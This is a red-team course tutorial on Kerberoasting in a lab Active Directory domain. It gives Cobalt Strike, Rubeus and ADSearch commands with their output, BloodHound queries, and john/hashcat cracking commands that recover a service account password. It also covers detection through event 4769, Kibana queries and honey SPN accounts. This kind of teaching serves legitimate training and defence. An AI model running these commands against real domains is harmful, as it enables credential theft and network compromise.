Services run on a machine under the context of a user account. These accounts are either local to the machine (LocalSystem, LocalService, NetworkService) or are domain accounts (e.g. DOMAIN\mssql).

A Service Principal Name (SPN) is a unique identifier of a service instance. SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/kerberos/spn.png)

  

Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service. Kerberoasting is a technique for requesting TGS’s for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.

`Rubeus kerberoast` can be used to perform the kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap

[*] Action: Kerberoasting
[*] Searching the current domain for Kerberoastable users
[*] Total kerberoastable users : 2

$krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]
$krb5tgs$23$*svc_honey$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io*$[...hash...]
```

  

This is pretty bad OPSEC.  Judging from the fake SPN set on the `svc_honey` account, we may have just wandered into a trap.  When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

You can find them in Kibana with:

```
event.code: 4769
```

  

Depending on how long your lab has been in use, there will be a _lot_ of events.  However, we can filter down to the specific account name:

```
event.code: 4769 and winlog.event_data.ServiceName : svc_honey
```

  

And this should return only one result - generated by the kerberoasting.  These types of honey traps is a common method for catching lazy tradecraft.  Because the SPN is not legitimate, it should never be in use and ergo, should never generate these events.  A blue team may configure automated alerting when suspicious activity is logged for a honey account.  You will see that the log also reveals the user who requested the TGS.

Other detection strategies such as volume analysis, i.e. a single account requesting tens/hundreds/thousands of TGS's in a single instant are also effective.

A much safer approach is to enumerate possible candidates first and kerberoast them selectively.  Simply searching (e.g. using custom LDAP queries) for accounts with SPNs will not trigger these 4769 events.

Find all users (in the current domain) where the **ServicePrincipalName** field is not blank.

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 2
    [+] cn : krbtgt
    [+] cn : MS SQL Service
    [+] cn : Honey Service
```

> Even though Rubeus does not include the `krbtgt` account, it can [sometimes](https://twitter.com/_wald0/status/1361720293539139589) be cracked.

You can also use BloodHound:

```
MATCH (u:User {hasspn:true}) RETURN u
```

  

And even extend that query to show paths to computers from those users:

```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

  

Once we feel safe about roasting a particular account, we can do so with the `/user` argument.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap

[*] Action: Kerberoasting

[*] Target User            : svc_mssql
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
[*] PwdLastSet             : 5/14/2021 1:28:34 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT

[*] Hash                   : $krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]
```

  

Use `--format=krb5tgs --wordlist=wordlist svc_mssql` for **john** or `-a 0 -m 13100 svc_mssql wordlist` for **hashcat**.

```
root@kali:~# john --format=krb5tgs --wordlist=wordlist svc_mssql
Cyberb0tic       (svc_mssql$dev.cyberbotic.io)
```


 > I experienced some hash format incompatibility with john. Removing the SPN so it became: `$krb5tgs$23$*svc_mssql$dev.cyberbotic.io*$6A9E[blah]` seemed to address the issue.